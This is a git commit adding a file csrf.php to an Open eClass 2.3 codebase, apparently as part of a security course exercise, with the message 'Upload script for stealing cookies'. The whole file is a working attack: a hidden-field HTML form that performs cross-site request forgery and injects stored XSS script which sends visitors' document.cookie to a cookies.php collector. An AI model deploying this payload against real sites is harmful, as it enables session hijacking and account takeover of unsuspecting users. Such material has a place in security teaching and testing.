8a8bae682c03aa1cb14c361cf58a7f2a16d9f6fa
kosmasdimitropoulos <kosmasdimi@gmail.com>
2019-04-15 17:14:46 +0300

    Upload script for stealing cookies and save them in cookietracker.txt

---
+++ openeclass-2.3/modules/conference/csrf.php
@@ -0,0 +1,7 @@
+<html>
+<form action =http://cal_duo.csec.gr/modules/work/work.php method="post" onsubmit="return checkrequired(this, "title");">
+	<input type="hidden" name="title" value='<script>document.location="http://cal_duo.csec.gr/modules/conference/cookies.php?cookie=" + document.cookie; </script>' class="FormData_InputText">
+	<input type="hidden" name="WorkEnd" value='<script>document.location="http://cal_duo.csec.gr/modules/conference/cookies.php?cookie=" + document.cookie; </script>'>
+	<input type="submit" name="new_assign" value="Click me!">
+</form>
+</html>
